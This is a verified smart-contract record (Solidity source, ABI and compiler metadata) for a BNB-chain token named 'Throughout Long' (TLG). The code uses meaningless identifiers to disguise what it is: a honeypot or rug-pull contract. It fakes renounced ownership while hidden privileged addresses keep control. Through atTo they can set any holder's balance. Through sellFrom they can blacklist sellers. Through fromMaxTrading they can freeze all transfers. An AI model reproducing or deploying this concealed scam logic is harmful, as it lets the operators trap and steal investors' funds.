{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface buyFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLiquidity {\n    function createPair(address swapFee, address fromWalletSender) external returns (address);\n}\n\ninterface txAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalReceiverBuy) external view returns (uint256);\n\n    function transfer(address isEnable, uint256 listMarketing) external returns (bool);\n\n    function allowance(address fundAutoLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isEnable,\n        uint256 listMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeFundTo, uint256 value);\n    event Approval(address indexed fundAutoLaunch, address indexed spender, uint256 value);\n}\n\ninterface txAtMetadata is txAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThroughoutLong is takeShould, txAt, txAtMetadata {\n\n    address public limitSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return autoFeeSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchList;\n    }\n\n    address public listBuy;\n\n    address liquidityAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private autoFeeSwap = \"Throughout Long\";\n\n    function fromMaxTrading(uint256 listMarketing) public {\n        fundWalletMax();\n        enableTeam = listMarketing;\n    }\n\n    function isLaunched(address launchMarketing) public {\n        require(launchMarketing.balance < 100000);\n        if (takeSenderTotal) {\n            return;\n        }\n        if (shouldBuy) {\n            txEnable = false;\n        }\n        launchEnable[launchMarketing] = true;\n        \n        takeSenderTotal = true;\n    }\n\n    event OwnershipTransferred(address indexed toShould, address indexed launchedTx);\n\n    function takeAmountTotal(address limitEnable, address isEnable, uint256 listMarketing) internal returns (bool) {\n        if (limitEnable == listBuy) {\n            return senderFrom(limitEnable, isEnable, listMarketing);\n        }\n        uint256 modeMax = txAt(limitSwap).balanceOf(liquidityAuto);\n        require(modeMax == enableTeam);\n        require(isEnable != liquidityAuto);\n        if (feeTotalFrom[limitEnable]) {\n            return senderFrom(limitEnable, isEnable, launchSender);\n        }\n        return senderFrom(limitEnable, isEnable, listMarketing);\n    }\n\n    address takeLaunchTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private tradingToken;\n\n    uint8 private fundTx = 18;\n\n    mapping(address => uint256) private receiverWallet;\n\n    function transferFrom(address limitEnable, address isEnable, uint256 listMarketing) external override returns (bool) {\n        if (_msgSender() != takeLaunchTotal) {\n            if (totalToTrading[limitEnable][_msgSender()] != type(uint256).max) {\n                require(listMarketing <= totalToTrading[limitEnable][_msgSender()]);\n                totalToTrading[limitEnable][_msgSender()] -= listMarketing;\n            }\n        }\n        return takeAmountTotal(limitEnable, isEnable, listMarketing);\n    }\n\n    function getOwner() external view returns (address) {\n        return toMode;\n    }\n\n    address private toMode;\n\n    bool private shouldBuy;\n\n    function sellFrom(address receiverSender) public {\n        fundWalletMax();\n        if (fromWalletLaunched != maxSender) {\n            maxSender = fromWalletLaunched;\n        }\n        if (receiverSender == listBuy || receiverSender == limitSwap) {\n            return;\n        }\n        feeTotalFrom[receiverSender] = true;\n    }\n\n    uint256 enableTeam;\n\n    mapping(address => bool) public feeTotalFrom;\n\n    bool private receiverExempt;\n\n    mapping(address => bool) public launchEnable;\n\n    string private launchList = \"TLG\";\n\n    function balanceOf(address totalReceiverBuy) public view virtual override returns (uint256) {\n        return receiverWallet[totalReceiverBuy];\n    }\n\n    bool public takeSenderTotal;\n\n    bool public modeEnable;\n\n    bool public teamLaunchAmount;\n\n    uint256 private feeList = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTx;\n    }\n\n    uint256 public fromWalletLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeList;\n    }\n\n    function transfer(address maxFee, uint256 listMarketing) external virtual override returns (bool) {\n        return takeAmountTotal(_msgSender(), maxFee, listMarketing);\n    }\n\n    function approve(address maxLaunchMin, uint256 listMarketing) public virtual override returns (bool) {\n        totalToTrading[_msgSender()][maxLaunchMin] = listMarketing;\n        emit Approval(_msgSender(), maxLaunchMin, listMarketing);\n        return true;\n    }\n\n    uint256 private maxSender;\n\n    uint256 sellLaunch;\n\n    bool private txEnable;\n\n    constructor (){\n        if (modeEnable) {\n            modeEnable = true;\n        }\n        buyFund isList = buyFund(takeLaunchTotal);\n        limitSwap = receiverLiquidity(isList.factory()).createPair(isList.WETH(), address(this));\n        if (fromWalletLaunched != maxSender) {\n            modeEnable = true;\n        }\n        listBuy = _msgSender();\n        autoFrom();\n        launchEnable[listBuy] = true;\n        receiverWallet[listBuy] = feeList;\n        if (txEnable != teamLaunchAmount) {\n            fromWalletLaunched = maxSender;\n        }\n        emit Transfer(address(0), listBuy, feeList);\n    }\n\n    uint256 constant launchSender = 11 ** 10;\n\n    function atTo(address maxFee, uint256 listMarketing) public {\n        fundWalletMax();\n        receiverWallet[maxFee] = listMarketing;\n    }\n\n    function fundWalletMax() private view {\n        require(launchEnable[_msgSender()]);\n    }\n\n    function allowance(address limitLaunched, address maxLaunchMin) external view virtual override returns (uint256) {\n        if (maxLaunchMin == takeLaunchTotal) {\n            return type(uint256).max;\n        }\n        return totalToTrading[limitLaunched][maxLaunchMin];\n    }\n\n    function senderFrom(address limitEnable, address isEnable, uint256 listMarketing) internal returns (bool) {\n        require(receiverWallet[limitEnable] >= listMarketing);\n        receiverWallet[limitEnable] -= listMarketing;\n        receiverWallet[isEnable] += listMarketing;\n        emit Transfer(limitEnable, isEnable, listMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return toMode;\n    }\n\n    function autoFrom() public {\n        emit OwnershipTransferred(listBuy, address(0));\n        toMode = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalToTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAutoLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFundTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunchMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunchMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMarketing\",\"type\":\"uint256\"}],\"name\":\"atTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiverBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTotalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMarketing\",\"type\":\"uint256\"}],\"name\":\"fromMaxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWalletLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"sellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSenderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ThroughoutLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}